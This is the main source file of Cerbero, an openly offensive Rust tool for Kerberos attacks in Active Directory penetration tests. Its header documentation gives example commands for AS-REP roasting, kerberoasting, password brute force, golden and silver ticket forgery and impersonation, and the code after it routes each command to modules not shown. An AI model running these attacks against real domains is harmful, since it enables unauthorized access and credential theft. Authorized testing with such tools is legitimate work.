//! # Cerbero
//!
//! Kerberos protocol attacker. Tool to perform several tasks
//! related with Kerberos protocol in an Active Directory pentest.
//!
//! ## Installation
//!
//! From crates:
//! ```sh
//! cargo install cerbero
//! ```
//!
//! From repo:
//! ```sh
//! git clone https://gitlab.com/Zer1t0/cerbero.git
//! cd cerbero/
//! cargo build --release
//! ```
//!
//! ## Commands
//! - [ask](#ask)
//! - [asreproast](#asreproast)
//! - [brute](#brute)
//! - [convert](#convert)
//! - [craft](#craft)
//! - [hash](#hash)
//! - [kerberoast](#kerberoast)
//! - [list](#list)
//!
//! ### Ask
//! The `ask` command allows to retrieve Kerberos tickets (TGT/TGS) from the KDC
//! (Domain Controller in Active Directory environment). Moreover also
//! perform requests to obtain tickets by using the S4U2Self and S4U2Proxy
//! Kerberos extensions.
//!
//! Ask TGT:
//! ```shell
//! cerbero ask -u Hades -d under.world -p IamtheKingofD34d!!
//! ```
//!
//! Ask TGS:
//! ```shell
//! cerbero ask -u Hades -d under.world -p IamtheKingofD34d!! --spn ldap/under.world
//! ```
//!
//! Perform S4u2self:
//! ```shell
//! cerbero ask -u Hades -d under.world -p IamtheKingofD34d!! --impersonate Zeus
//! ```
//!
//! Perform S4u2proxy:
//! ```shell
//! cerbero ask -u Hades -d under.world -p IamtheKingofD34d!! --impersonate Zeus --spn ldap/under.world
//! ```
//!
//!
//! ### AsRepRoast
//! `asreproast` can be used to discover users that do not require
//! pre-authentication and retrieve a ticket to crack with hashcat or john.
//!
//! Check many users:
//! ```shell
//! cerbero asreproast under.world users.txt
//! ```
//!
//! Check many users with weak RC4 cipher (easier to crack):
//! ```shell
//! cerbero asreproast under.world users.txt --cipher rc4
//! ```
//!
//! ### Brute
//! `brute` performs TGTs requests in order to discover user credentials
//! based on the KDC response. This bruteforce technique allows you to
//! discover:
//! + Valid username/password pairs
//! + Valid usernames
//! + Expired passwords
//! + Blocked or disabled users
//!
//! This attack should be performed carefully since can block user
//! accounts in case of perform many incorrect authentication attemps
//! for the same user.
//!
//! Test many users and passwords:
//! ```shell
//! cerbero brute under.world users.txt passwords.txt
//! ```
//!
//! Test one user and many passwords:
//! ```shell
//! cerbero brute under.world Zeus passwords.txt
//! ```
//!
//! Test many users and one password:
//! ```shell
//! cerbero brute under.world users.txt Olympus1234
//! ```
//!
//! Test one user and one password:
//! ```shell
//! cerbero brute under.world Zeus Olympus1234
//! ```
//!
//! ### Convert
//! Allows to `convert` ticket files between krb (Windows) and
//! ccache (Linux) formats.
//!
//! Convert ccache to krb:
//! ```shell
//! cerbero convert hades.ccache hades.krb
//! ```
//!
//! Convert krb to ccache:
//! ```shell
//! cerbero convert hades.krb hades.ccache
//! ```
//! ### Craft
//! To `craft` golden and silver tickets.
//!
//! Craft a golden ticket (by using the `krbtgt` AES256 key):
//! ```shell
//! cerbero craft --realm under.world --realm-sid S-1-5-21-658410550-3858838999-180593761 --user kratos --aes-256 fed0c966ff7f88d776bb35fed0f039725f8bbb87017d5b6b76ee848f25562d2c
//! ```
//!
//! Craft a silver ticket (for the service `cifs` hosted by the machine `styx`):
//! ```shell
//! cerbero craft --realm under.world --realm-sid S-1-5-21-658410550-3858838999-180593761 --user kratos --ntlm 29f9ab984728cc7d18c8497c9ee76c77 --spn cifs/styx,under.world
//! ```
//!
//! ### Hash
//! Calculate the Kerberos keys (password hashes) from the user password.
//!
//! Calculate RC4 key (NT hash):
//! ```shell
//! $ cerbero hash -p 'IamtheKingofD34d!!'
//! rc4:86e0a04f7a44ed4d4a7eaf2ee977c799
//! ```
//!
//! Calculate all the keys:
//! ```shell
//! $ cerbero hash -p 'IamtheKingofD34d!!' -u Hades -d under.world
//! rc4:86e0a04f7a44ed4d4a7eaf2ee977c799
//! aes128:fe165dec904772a90a177069e4ea7019
//! aes256:1304965c35176aeb72e1ae5fdd6c2fe2e901af7223cb75f5eaac25ad667136e7
//! ```
//!
//! ### Kerberoast
//! To format encrypted part of tickets in order to be cracked by hashcat or john.
//!
//! ```shell
//! cerbero kerberoast -s services.txt --realm under.world --user Hades -p IamtheKingofD34d!!
//! ```
//! To get a list of services you could use `ldapsearch`:
//! ```shell
//! ldapsearch -b "dc=under,dc=world" -w IamtheKingofD34d!! -D "Hades@under.world" "(&(samAccountType=805306368)(servicePrincipalName=*)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" servicePrincipalName | grep servicePrincipalName: | cut -d ' ' -f 2 | tee services.txt
//! ```
//!
//! ### List
//! `list` shows the tickets information of a credentials file. Similar
//! to `klist` command
//!
//! ```shell
//! cerbero list hades.ccache
//! ```
//!
//! ## Credits
//! This work is based on great work of other people:
//! - [Impacket](https://github.com/SecureAuthCorp/impacket) of Alberto Solino [@agsolino](https://github.com/agsolino)
//! - [Rubeus](https://github.com/GhostPack/Rubeus) of Will [@harmj0y](https://twitter.com/harmj0y) and Elad Shamir [@elad_shamir](https://twitter.com/elad_shamir)
//! - [Mimikatz](https://github.com/gentilkiwi/mimikatz) of [@gentilkiwi](https://twitter.com/gentilkiwi)

mod args;
mod commands;
mod core;
mod error;
mod transporter;
mod utils;

use crate::args::{args, Arguments, ArgumentsParser};
use crate::core::KerberosUser;
use crate::core::{EmptyVault, FileVault, Vault};
use crate::error::Result;
use crate::utils::{read_file_lines, resolve_and_get_tranporter};
use log::error;
use stderrlog;

fn init_log(verbosity: usize) {
    stderrlog::new()
        .module(module_path!())
        .verbosity(verbosity)
        .init()
        .unwrap();
}

fn main() {
    let args = ArgumentsParser::parse(&args().get_matches());

    if let Err(error) = main_inner(args) {
        error!("{}", error);
    }
}

fn main_inner(args: Arguments) -> Result<()> {
    match args {
        Arguments::Ask(args) => ask(args),
        Arguments::AsRepRoast(args) => asreproast(args),
        Arguments::Brute(args) => brute(args),
        Arguments::Convert(args) => convert(args),
        Arguments::Craft(args) => craft(args),
        Arguments::Hash(args) => hash(args),
        Arguments::KerbeRoast(args) => kerberoast(args),
        Arguments::List(args) => list(args),
    }
}

fn ask(args: args::ask::Arguments) -> Result<()> {
    init_log(args.verbosity);

    let transporter = resolve_and_get_tranporter(
        args.kdc_ip,
        &args.user.realm,
        args.kdc_port,
        args.transport_protocol,
    )?;

    let creds_file = utils::get_ticket_file(
        args.out_file,
        &args.user.name,
        &args.credential_format,
    );

    let impersonate_user = match args.impersonate_user {
        Some(username) => {
            Some(KerberosUser::new(username, args.user.realm.clone()))
        }
        None => None,
    };

    let vault = FileVault::new(creds_file);

    return commands::ask(
        args.user,
        impersonate_user,
        args.service,
        &vault,
        &*transporter,
        args.user_key,
        args.credential_format,
    );
}

fn convert(args: args::convert::Arguments) -> Result<()> {
    init_log(args.verbosity);
    let in_file = match args.in_file {
        Some(filename) => filename,
        None => utils::get_env_ticket_file().ok_or(
            "Unable to detect input file, specify -i/--input or KRB5CCNAME",
        )?,
    };

    let in_vault = FileVault::new(in_file);
    let out_vault = FileVault::new(args.out_file);

    return commands::convert(&in_vault, &out_vault, args.cred_format);
}

fn craft(args: args::craft::Arguments) -> Result<()> {
    let creds_file = utils::get_ticket_file(
        args.credential_file,
        &args.username,
        &args.credential_format,
    );

    let user = KerberosUser::new(args.username, args.realm);
    let vault = FileVault::new(creds_file);

    return commands::craft(
        user,
        args.service,
        args.key,
        args.user_rid,
        args.realm_sid,
        &args.groups,
        None,
        args.credential_format,
        &vault,
    );
}

fn hash(args: args::hash::Arguments) -> Result<()> {
    init_log(args.verbosity);
    return commands::hash(
        args.realm.as_ref(),
        args.username.as_ref(),
        &args.password,
    );
}

fn list(args: args::list::Arguments) -> Result<()> {
    let in_file = match args.in_file {
        Some(filename) => filename,
        None => utils::get_env_ticket_file()
            .ok_or("Specify file or set KRB5CCNAME")?,
    };

    let in_vault = FileVault::new(in_file);
    return commands::list(&in_vault, args.etypes, args.flags);
}

fn brute(args: args::brute::Arguments) -> Result<()> {
    init_log(args.verbosity);

    let usernames = match read_file_lines(&args.users) {
        Ok(users) => users,
        Err(_) => vec![args.users],
    };

    let passwords = match read_file_lines(&args.passwords) {
        Ok(passwords) => passwords,
        Err(_) => vec![args.passwords],
    };

    let transporter = resolve_and_get_tranporter(
        args.kdc_ip,
        &args.realm,
        args.kdc_port,
        args.transport_protocol,
    )?;

    return commands::brute(
        &args.realm,
        usernames,
        passwords,
        &*transporter,
        args.cred_format,
    );
}

fn asreproast(args: args::asreproast::Arguments) -> Result<()> {
    init_log(args.verbosity);

    let usernames = match read_file_lines(&args.users) {
        Ok(users) => users,
        Err(_) => vec![args.users],
    };

    let transporter = resolve_and_get_tranporter(
        args.kdc_ip,
        &args.realm,
        args.kdc_port,
        args.transport_protocol,
    )?;

    return commands::asreproast(
        &args.realm,
        usernames,
        args.crack_format,
        &*transporter,
        args.etype,
    );
}

fn kerberoast(args: args::kerberoast::Arguments) -> Result<()> {
    init_log(args.verbosity);

    let services = match read_file_lines(&args.services) {
        Ok(users) => users,
        Err(_) => vec![args.services],
    };

    let transporter = resolve_and_get_tranporter(
        args.kdc_ip,
        &args.realm,
        args.kdc_port,
        args.transport_protocol,
    )?;

    let creds_file = match args.creds_file {
        Some(filename) => Some(filename),
        None => utils::get_env_ticket_file(),
    };

    let in_vault: Box<dyn Vault>;
    let out_vault: Option<FileVault>;

    if let Some(creds_file) = creds_file {
        in_vault = Box::new(FileVault::new(creds_file.clone()));

        out_vault = match args.save_tickets {
            true => Some(FileVault::new(creds_file)),
            false => None,
        }
    } else {
        in_vault = Box::new(EmptyVault::new());

        out_vault = match args.save_tickets {
            true => Err("Specify credentials file or set KRB5CCNAME")?,
            false => None,
        }
    }

    let user = KerberosUser::new(args.username, args.realm);

    let out_ref_vault = out_vault.as_ref();

    return commands::kerberoast(
        user,
        services,
        &*in_vault,
        out_ref_vault.map(|a| a as &dyn Vault),
        args.user_key.as_ref(),
        &*transporter,
        args.credential_format,
        args.crack_format,
        args.etype,
    );
}
